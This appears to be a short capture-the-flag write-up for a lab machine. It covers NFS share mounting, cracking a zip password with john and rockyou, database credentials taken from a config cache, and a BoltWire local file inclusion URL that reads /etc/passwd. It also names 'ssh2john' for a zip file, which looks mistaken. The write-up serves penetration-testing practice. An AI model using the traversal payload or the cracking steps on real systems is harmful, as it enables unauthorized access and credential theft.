## nfs

We can also take a look at the 2049 nfs port

We check what folders we can mount with 

`showmount -e 192.168.120.136`

We see that we can mount `/srv/nfs`

We use this command: `sudo mount -t nfs 192.168.120.136:/srv/nfs /tmp/dev -o nolock`

There is a `save.zip` file that we will have to use ssh2john to unzip

`ssh2john save.zip > hash.txt`

`john hash.txt --wordlist=rockyou`

The password is `java101` and we unzip two files

A private rsa key, and a todo.txt that is signed by a "jp"


---


## dev.tcm

Looking through the dev.tcm port 80 directories, we can find some possible creds in
`dev.tcm/app/cache/config-cache.json`

```
            "driver": "pdo_sqlite",
            "host": "localhost",
            "slaves": [],
            "dbname": "bolt",
            "prefix": "bolt_",
            "charset": "utf8",
            "collate": "utf8_unicode_ci",
            "randomfunction": "RANDOM()",
            "databasename": "bolt",
            "username": "bolt",
            "password": "I_love_java",
            "user": "bolt",
            "wrapperClass": "Bolt\\Storage\\Database\\Connection",
            "path": "/var/www/html/app/database/bolt.db"
```

We can log into `dev.tcm:8080/dev` with these creds

`bolt:I_love_java`

I_love_java


---

## boltwire

We know the website is using boltwire. 

We do a searchsploit for boltwire and see there is an LFI exploit for v6.03

The LFI exploit works when logged in as `bolt`

Example:

```
http://dev.tcm:8080/dev/index.php?p=action.search&action=../../../../../../etc/passwd
```

Looking at the user list we see that jeanpaul is a user... we have his rsa private key


---



